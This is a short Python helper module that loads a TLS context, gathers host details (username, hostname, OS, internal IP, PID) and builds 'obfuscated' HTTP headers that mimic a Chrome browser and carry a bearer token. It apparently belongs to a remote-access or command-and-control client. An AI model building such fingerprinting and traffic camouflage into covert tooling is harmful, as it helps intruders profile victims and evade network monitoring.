import ssl
import os
import platform
import socket
import getpass
from logger import logger


def load_ssl_context(cert_path: str = None, key_path: str = None) -> ssl.SSLContext:
    try:
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)

        if cert_path and os.path.exists(cert_path):
            if key_path and os.path.exists(key_path):
                context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            else:
                context.load_verify_locations(cafile=cert_path)

        context.minimum_version = ssl.TLSVersion.TLSv1_2
        return context
    except Exception as e:
        logger.error(f"Crypto Error: Failed to load SSL context: {e}")
        return None


def get_system_info() -> dict:
    try:
        info = {
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "os": platform.system(),
            "os_release": platform.release(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "internal_ip": socket.gethostbyname(socket.gethostname()),
            "pid": os.getpid()
        }
        return info
    except Exception as e:
        logger.debug(f"Utility Error: Failed to gather sysinfo: {e}")
        return {"error": "info_gathering_failed"}


def get_obfuscated_headers(token: str) -> dict:
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Authorization": f"Bearer {token}",
        "Connection": "keep-alive"
    }